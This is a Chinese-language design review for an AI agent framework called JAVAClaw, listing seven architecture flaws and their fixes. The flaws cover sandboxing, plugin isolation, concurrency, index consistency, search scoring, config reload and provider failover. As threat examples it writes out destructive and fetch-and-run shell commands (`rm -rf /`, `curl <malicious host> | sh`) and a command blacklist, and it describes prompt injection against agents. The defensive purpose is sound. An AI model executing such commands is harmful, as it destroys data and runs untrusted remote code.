# JAVAClaw 架构问题清单

> 初版架构设计中发现的 7 个问题，按优先级排列。每个问题说明：问题是什么、会导致什么后果、用什么方法解决。

---

## [P0-1] 安全上线顺序有窗口期

**问题**：ShellTool 在 Phase 3 上线，但 Docker 沙箱在 Phase 6 才上线，中间隔了 3 个阶段。等于高危工具（能执行任意系统命令）先裸跑。

**会导致什么错误**：
- Agent 被提示词注入后，可以直接在宿主机执行 `rm -rf /`、`curl 恶意地址 | sh` 等命令，没有任何隔离
- 开发和测试阶段养成"裸跑习惯"，上线后沙箱集成容易出兼容性问题（因为从没一起测过）
- 如果 Phase 3 到 Phase 6 之间有外部用户接入（如 Telegram），攻击面完全暴露

**解决方案**：沙箱与工具同步上线（Phase 3）。
- 新增 `ToolExecutor` 接口，所有工具通过它执行，不直接调用 `ProcessBuilder`
- `DockerExecutor`：Docker 可用时，`docker run --rm --network=none -v workdir:/work image sh -c "command"` 隔离执行
- `RestrictedNativeExecutor`：Docker 不可用时的降级方案——工作目录白名单、命令黑名单（`rm -rf /`、`mkfs`、`dd` 等）、执行超时（30s）、输出截断（1MB）
- Phase 6 变为"沙箱加固"：资源限制（CPU/内存）、自动检测 Docker 可用性、策略配置

---

## [P0-2] 插件安全边界不成立

**问题**：原设计说"JAR 比 npm 安全"，但进程内通过 SPI 加载第三方 JAR，该 JAR 拥有宿主 JVM 的全部权限。

**会导致什么错误**：
- 恶意插件可以读取 `~/.javaclaw/config.yaml` 中的所有 API Key
- 恶意插件可以通过 `Runtime.exec()` 执行任意系统命令
- 恶意插件可以通过反射访问其他模块的内部状态，篡改 Agent 行为
- 恶意插件可以开启网络监听，窃取所有 LLM 请求和响应内容
- 本质上和 npm 供应链攻击一样危险，只是攻击方式不同

**解决方案**：插件双轨制——可信插件进程内，不可信插件进程外隔离。
- **Track A（内置/可信）**：SPI 进程内加载，仅用于官方插件和用户自己编写的插件，放在 `~/.javaclaw/plugins/trusted/`
- **Track B（第三方/不可信）**：独立 JVM 子进程运行，通过 stdin/stdout JSON-RPC 通信，放在 `~/.javaclaw/plugins/sandboxed/`
- 插件清单 `plugin.yaml` 声明权限需求（网络、文件系统、Shell），加载时弹出确认
- 默认所有第三方插件走 Track B，用户可手动"信任"升级到 Track A

---

## [P1-3] 并发模型混用

**问题**：架构中同时出现了三种并发范式——Virtual Threads（同步阻塞）、Flux（响应式流）、同步 `Tool.execute()` 返回值，三者的取消、背压、阻塞语义互不兼容。

**会导致什么错误**：
- Virtual Thread 中调用 Flux 的阻塞方法（如 `block()`）会触发 Reactor 的 "blocking call in non-blocking context" 警告，某些场景下直接抛异常
- 用户取消请求时，Flux 的 `dispose()` 无法传播到 Virtual Thread 的 `interrupt()`，导致 Agent Loop 继续执行已取消的任务，浪费 LLM token
- Tool 执行超时时，同步 `execute()` 阻塞了 Virtual Thread，但 Flux 的超时机制无法中断它，导致请求挂起
- 背压失效：LLM 流式返回 token 很快，但 WebSocket 推送慢时，没有统一的背压机制，内存中堆积大量未发送的事件

**解决方案**：统一为 Virtual Threads 同步模型，Flux 只用在两个对外边界。
- 内部一律同步阻塞：`Tool.execute()`、`Provider.chat()`、`MemoryStore.recall()` 全部同步，跑在 Virtual Threads 上
- Flux 只出现在两个边界：
  1. `AgentOrchestrator.runStream()` — 对外推送流式事件给 WebSocket/SSE 客户端
  2. `ModelProvider.chatStream()` — 接收 LLM 的流式 token
- 桥接：Provider 内部用 `BlockingQueue` 把流式 token 转为同步 `Iterator<ChatEvent>`，Agent Loop 同步消费
- 取消：Virtual Thread 用 `Thread.interrupt()`，在两个边界处做一次转换为 `Disposable.dispose()`

---

## [P1-4] PostgreSQL + Lucene 的一致性没定义

**问题**：会话历史存在 PostgreSQL，长期记忆索引在 Lucene，但两者之间没有定义事务边界、失败补偿和重建策略。

**会导致什么错误**：
- PG 写入成功但 Lucene 索引失败（如磁盘满、JVM 崩溃）→ 记忆"存了但搜不到"，用户以为 Agent 忘了
- Lucene 索引损坏（断电、异常关闭）→ 所有长期记忆检索失效，Agent 退化为无记忆状态，且没有自动恢复手段
- PG 和 Lucene 数据不一致 → `forget()` 删了 PG 记录但 Lucene 索引还在，搜索返回已删除的记忆（幽灵数据）
- 没有重建机制 → 一旦索引出问题，只能手动删除 Lucene 数据目录重来，丢失所有索引优化

**解决方案**：最终一致 + 异步索引 + 重建机制。
- PostgreSQL 是 source of truth，Lucene 是派生索引，丢了可以从 PG 重建
- 写入顺序：先写 PG（事务提交）→ 再异步更新 Lucene 索引
- 异步队列：`index_queue` 表记录待索引的 `memory_id`，后台线程消费并更新 Lucene
- 失败补偿：后台定时扫描 `index_queue` 中未完成的条目重试
- 全量重建：`/admin/reindex` 命令，启动时检测索引版本号，不匹配则自动重建

---

## [P1-5] 混合检索打分过于理想化

**问题**：原设计用 `score = α * vectorScore + (1-α) * keywordScore` 线性加权合并向量搜索和关键词搜索的结果，但两种分数的量纲和分布完全不同。

**会导致什么错误**：
- 向量搜索的余弦相似度范围是 [0, 1]，BM25 分数范围是 [0, +∞)，直接加权后 BM25 会压倒向量分数，α 参数形同虚设
- 同一个 α 值在不同查询下表现差异巨大：短查询 BM25 分数低，长查询 BM25 分数高，导致召回结果不稳定
- 语义相关但关键词不匹配的记忆被排到后面（如用户问"怎么部署"但记忆里写的是"上线流程"），混合搜索反而不如纯向量搜索
- 调参困难：α 的最优值随数据量、查询类型、语言变化，没有通用最优解

**解决方案**：改用 Reciprocal Rank Fusion (RRF)。
- RRF 只依赖排名不依赖原始分数，天然解决量纲问题
- 公式：`RRF_score(d) = 1/(k + rank_vector(d)) + 1/(k + rank_keyword(d))`，k=60
- 如果某文档只在一个列表中出现，另一个 rank 设为大数（如 1000）
- 两个搜索各返回 Top-N 带排名，合并后按 RRF 分数重排，取 Top-K
- 无需调参，k=60 是业界验证过的默认值

---

## [P2-6] 配置热更新方案偏理想

**问题**：原设计直接写"支持热重载（Spring `@RefreshScope`）"，但 `@RefreshScope` 只能刷新 Spring Bean 的属性，无法自动处理本地文件监听、安全策略一致性、运行中组件的状态迁移。

**会导致什么错误**：
- `@RefreshScope` 需要 Spring Cloud Config Server 或 Actuator 的 `/refresh` 端点触发，本地文件改了不会自动生效，用户改完配置以为生效了实际没有
- 安全策略（白名单、审批规则）被热更新后，如果配置文件被恶意篡改（如通过一个已获权的工具），攻击者可以静默关闭安全检查
- `@RefreshScope` 重建 Bean 时会短暂中断正在处理的请求，如果 Agent 正在执行多轮 tool_call 循环，中途 Provider Bean 被重建会导致请求失败
- 配置项之间有依赖关系（如切换模型后限流阈值也要变），`@RefreshScope` 无法保证原子更新，可能出现不一致的中间状态

**解决方案**：分层配置 + 自研 ConfigWatcher，不依赖 Spring 魔法。
- 配置分三级：
  - **静态**（改了要重启）：数据库连接、端口、沙箱类型、插件目录
  - **热更新**（运行时可改）：模型选择、Channel 启用/禁用、工具权限、提示词模板
  - **安全策略**（热更新但需确认）：白名单、审批规则、限流阈值——变更需配对码二次验证
- `ConfigWatcher` 用 `WatchService` 监听配置文件变更，解析后通知实现了 `Reconfigurable` 接口的组件
- 安全策略变更需要二次确认，防止配置文件被篡改后静默生效

---

## [P2-7] Provider 可靠性设计不完整

**问题**：原设计只写了"重试：指数退避"和"降级：主模型不可用时切备用"，缺少超时预算、熔断、限流联动、幂等键等工程化要素。

**会导致什么错误**：
- 没有超时预算：每次重试都给满超时时间（如 30s × 3 次 = 90s），用户等 90 秒才收到降级响应，体验极差
- 没有熔断：模型 API 宕机时，每个请求都要经历"重试 → 全部超时 → 降级"的完整流程，系统吞吐量暴跌，所有用户都受影响
- 没有限流联动：不知道当前模型的 RPM/TPM 消耗，等到收到 429（Too Many Requests）才降级，此时已经浪费了一次请求的等待时间
- 没有幂等键：网络超时后重试，如果第一次请求其实成功了，会重复消耗 token，同一个问题被计费两次
- 只有"主+备"两级降级：备用模型也挂了就彻底不可用，没有兜底

**解决方案**：补全完整的可靠性工程。
- **超时预算**：每个请求有总超时（如 120s），重试共享预算，预算耗尽直接降级
- **熔断**：连续失败 ≥ 3 次 → 熔断打开 → 后续请求直接走降级模型，不再尝试主模型；每 60s 放一个探测请求，成功则关闭熔断
- **限流联动**：记录每个模型的 RPM/TPM 消耗，接近限额时主动切换备用模型，不等 429
- **幂等键**：非流式请求生成 `idempotency_key = hash(model + messages)`，命中缓存直接返回，避免重试重复计费
- **降级链**：有序降级列表（如 `deepseek-v3 → gpt-4o-mini → ollama/qwen2.5`），本地模型作为最终兜底
